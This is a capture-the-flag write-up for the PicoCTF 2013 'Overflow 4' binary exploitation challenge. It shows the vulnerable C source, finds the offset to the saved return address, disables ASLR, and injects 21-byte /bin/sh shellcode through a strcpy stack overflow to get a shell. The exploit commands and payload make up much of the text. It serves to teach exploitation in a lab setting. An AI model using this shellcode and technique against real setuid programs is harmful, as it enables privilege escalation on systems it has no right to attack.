# PicoCTF 2013: Overflow 4

**Category:** Binary Exploitation
**Points:** 150
**Description:**

>Stack overflows are the most basic binary exploitation technique, but they
>take a lot of skill to master. If you already know some C, these problems can
>help acquaint you with stacks and binary exploitation in general.

>Problem available on the shell machine in
>/problems/stack_overflow_4_4834efeff17abdfb , downloadable [here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb) with source
>[here](https://2013.picoctf.com/problems/overflow4-4834efeff17abdfb.c).

>If you solve the problem you will be able to read the key file by running

>cat /problems/stack_overflow_4_4834efeff17abdfb/key
>on the PicoCTF shell machine.

>**HINT:**  Gonna need some [shellcode](http://en.wikipedia.org/wiki/Shellcode). Luckily some is provided for you in the
>directory on the shell machine.

## Write-up

Let's look at the source:
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"


/*
 * Goal: Get the program to run a shell.
 */

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow_shellcode [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(argv[1]);
    return 0;
}
```

No convenient functions, and no calls to system are given to us. This means
that we need to get shellcode to run.

**Disclaimer: I've spoken to people who solved this during the actual contest. They
said that using ulimit to solve this problem was encouraged and/or hinted at by
the creators. In addition, I haven't been able to exploit it with ASLR
enabled.**

Now that that's out of the way, the first thing we do is find the offset before
we hijack `eip`

```
$ ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76 + "BBBB"')

Stack dump:
0xffc3b180: 0xffc3c800 (first argument)
0xffc3b17c: 0x42424242 (saved eip)
0xffc3b178: 0x41414141 (saved ebp)
0xffc3b174: 0x41414141
0xffc3b170: 0x41414141
0xffc3b16c: 0x41414141
0xffc3b168: 0x41414141
0xffc3b164: 0x41414141
0xffc3b160: 0x41414141
0xffc3b15c: 0x41414141
0xffc3b158: 0x41414141
0xffc3b154: 0x41414141
0xffc3b150: 0x41414141
0xffc3b14c: 0x41414141
0xffc3b148: 0x41414141
0xffc3b144: 0x41414141
0xffc3b140: 0x41414141
0xffc3b13c: 0x41414141
0xffc3b138: 0x41414141
0xffc3b134: 0x41414141
0xffc3b130: 0x41414141 (beginning of buffer)
Segmentation fault (core dumped)
```

Now if you didn't read up on shellcode (go do it!) then here's the gist:
shellcode is a general name for assembly code that does what you want it to.
Some are forkbombs, some are connect back, this one just uses a `syscall` to
get us a shell. Regardless of what it does, if you have the address where the
shellcode is stored, you can put that into `%eip` to run it. Let's disable ASLR
so we have constant stack addresses.

```
$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print "A"*76
+ "BBBB"')
Stack dump:
0xffffd660: 0xffffd800 (first argument)
0xffffd65c: 0x42424242 (saved eip)
0xffffd658: 0x41414141 (saved ebp)
0xffffd654: 0x41414141
0xffffd650: 0x41414141
0xffffd64c: 0x41414141
0xffffd648: 0x41414141
0xffffd644: 0x41414141
0xffffd640: 0x41414141
0xffffd63c: 0x41414141
0xffffd638: 0x41414141
0xffffd634: 0x41414141
0xffffd630: 0x41414141
0xffffd62c: 0x41414141
0xffffd628: 0x41414141
0xffffd624: 0x41414141
0xffffd620: 0x41414141
0xffffd61c: 0x41414141
0xffffd618: 0x41414141
0xffffd614: 0x41414141
0xffffd610: 0x41414141 (beginning of buffer)
Segmentation fault (core dumped)
```
If you run this command multiple times, you will see that the addresses on the
left won't change from run to run. We've disabled ASLR. Now here's the plan to
get a shell. Since we know the address of our buffer, 0xffffd610, we can
reliably jump to it. We can put the shellcode in the first part of our buffer,
and then supply the address to `%eip` hopefully giving us a shell! (The length
of the shellcode I usually use is 21 bytes)

```
$ setarch `uname -m` -R ./overflow4-4834efeff17abdfb $(python -c 'print
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+ "A"*(76-21) + "\x10\xd6\xff\xff"')
Stack dump:
0xffffd660: 0xffffd800 (first argument)
0xffffd65c: 0xffffd610 (saved eip)
0xffffd658: 0x41414141 (saved ebp)
0xffffd654: 0x41414141
0xffffd650: 0x41414141
0xffffd64c: 0x41414141
0xffffd648: 0x41414141
0xffffd644: 0x41414141
0xffffd640: 0x41414141
0xffffd63c: 0x41414141
0xffffd638: 0x41414141
0xffffd634: 0x41414141
0xffffd630: 0x41414141
0xffffd62c: 0x41414141
0xffffd628: 0x41414141
0xffffd624: 0x41414180
0xffffd620: 0xcde3896e
0xffffd61c: 0x69622f68
0xffffd618: 0x68732f2f
0xffffd614: 0x68510bb0
0xffffd610: 0xe1f7c931 (beginning of buffer)
$
```

pwn.

## Other write-ups and resources

* none yet
